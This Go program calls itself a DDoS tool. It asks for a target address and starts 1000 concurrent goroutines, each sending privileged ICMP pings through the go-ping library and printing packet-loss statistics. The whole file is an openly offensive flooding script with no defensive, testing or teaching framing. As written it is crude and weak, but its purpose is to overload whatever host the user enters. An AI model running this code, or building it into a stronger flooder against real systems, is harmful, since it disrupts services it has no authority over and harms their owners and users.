package main

import (
  "github.com/go-ping/ping"
  "log"
  "fmt"
)

func startDdos(addr string, id int) {
  pinger, err := ping.NewPinger(addr)
  if err != nil {
    log.Fatal("Error with new pinger: ", err)
  }
  pinger.SetPrivileged(true)
  pinger.OnFinish = func(stat *ping.Statistics) {
    fmt.Println("ID:", id)
    fmt.Println("Packets received:", stat.PacketsRecv)
    fmt.Println("Packets sent:", stat.PacketsSent)
    fmt.Print("Packets loss: ", stat.PacketLoss, "%\n")
  }
  pinger.Count = 3
  err = pinger.Run()
  if err != nil {
    log.Fatal(err)
  }
}

func main()  {
  var addr string
  fmt.Println("Enter address:")
  fmt.Scanf("%s", &addr)
  for i := 0; i < 1000; i++ {
    go startDdos(addr, i)
  }
  var input string
  fmt.Scanln(&input)
}
